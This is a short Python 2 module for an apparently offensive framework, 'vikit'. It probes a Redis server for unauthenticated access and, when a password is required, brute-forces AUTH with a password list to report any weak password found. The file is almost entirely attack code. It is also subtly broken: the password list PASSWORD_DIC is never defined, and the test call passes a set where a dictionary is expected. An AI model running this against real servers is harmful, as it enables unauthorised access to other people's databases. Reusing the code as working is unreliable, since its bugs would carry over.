#!/usr/bin/env python
#coding:utf-8
"""
  Author:   --<v1ll4n>
  Purpose: Mod
  Created: 05/21/17
"""

import time
import socket

from vikit.core.basic.modinput import TargetDemand, PayloadDemand, ParamDemand
from vikit.core.basic import target, payload, param


NAME = 'redis_demo'

AUTHOR = 'vikit'

DESCRIPTION = 'description about a redis crack'

RESULT_DESC = '''this description is about result!'''

DEMANDS = [TargetDemand('target', target.TYPE_IPV4),
           ParamDemand('port', param.TYPE_INT)]



def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "redis_version" in result:
            return u"未授权访问"
        elif "Authentication" in result:
            for pass_ in PASSWORD_DIC:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send("AUTH %s\r\n" % (pass_))
                result = s.recv(1024)
                if '+OK' in result:
                    return u"存在弱口令，密码：%s" % (pass_)
    except Exception, e:
        return False

#----------------------------------------------------------------------
def exploit(target, payload, config):
    
    timeout = 5
    port = 6379
    if config.has_key('port'):
        port=int(config['port'])

    if check(target, port, timeout) != False:
        return 'success'
    else:
        return 'failed'


EXPORT_FUNC = exploit


if __name__ == '__main__':
    print exploit('192.168.1.183','',{'port:6379'})